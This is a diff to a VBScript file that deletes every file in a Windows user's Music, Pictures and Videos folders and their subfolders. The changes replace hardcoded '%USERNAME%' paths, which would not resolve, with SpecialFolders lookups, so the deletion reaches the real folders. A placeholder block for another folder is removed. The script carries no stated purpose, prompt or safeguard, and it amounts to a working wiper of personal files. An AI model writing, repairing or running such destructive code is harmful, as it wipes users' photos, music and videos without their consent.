@@ -52,7 +52,7 @@ Set objSubFolder = Nothing
 Set objFolder = Nothing
 
 ' Get the music folder
-Set objFolder = objFSO.GetFolder("C:\Users\%USERNAME%\Music")
+Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("MyMusic"))
 
 ' Loop through each file in the music folder and delete it
 For Each objFile In objFolder.Files
@@ -73,7 +73,7 @@ Set objSubFolder = Nothing
 Set objFolder = Nothing
 
 ' Get the pictures folder
-Set objFolder = objFSO.GetFolder("C:\Users\%USERNAME%\Pictures")
+Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("MyPictures"))
 
 ' Loop through each file in the pictures folder and delete it
 For Each objFile In objFolder.Files
@@ -94,7 +94,7 @@ Set objSubFolder = Nothing
 Set objFolder = Nothing
 
 ' Get the videos folder
-Set objFolder = objFSO.GetFolder("C:\Users\%USERNAME%\Videos")
+Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("MyVideos"))
 
 ' Loop through each file in the videos folder and delete it
 For Each objFile In objFolder.Files
@@ -102,27 +102,6 @@ For Each objFile In objFolder.Files
 Next
 
 ' Loop through each subfolder in the videos folder
-For Each objSubFolder In objFolder.SubFolders
-    ' Loop through each file in the subfolder and delete it
-For Each objFile In objSubFolder.Files
-objFSO.DeleteFile(objFile)
-Next
-Next
-
-' Release FileSystemObject resources
-Set objFile = Nothing
-Set objSubFolder = Nothing
-Set objFolder = Nothing
-
-' Get the other possible folder
-Set objFolder = objFSO.GetFolder("C:\Users%USERNAME%\OtherPossibleFolder")
-
-' Loop through each file in the other possible folder and delete it
-For Each objFile In objFolder.Files
-objFSO.DeleteFile(objFile)
-Next
-
-' Loop through each subfolder in the other possible folder
 For Each objSubFolder In objFolder.SubFolders
 ' Loop through each file in the subfolder and delete it
 For Each objFile In objSubFolder.Files
@@ -135,6 +114,4 @@ Set objFile = Nothing
 Set objSubFolder = Nothing
 Set objFolder = Nothing
 
-' Create a Shell object
-Set objShell = CreateObject("WScript.Shell")
 ' Continue with the rest of the code...
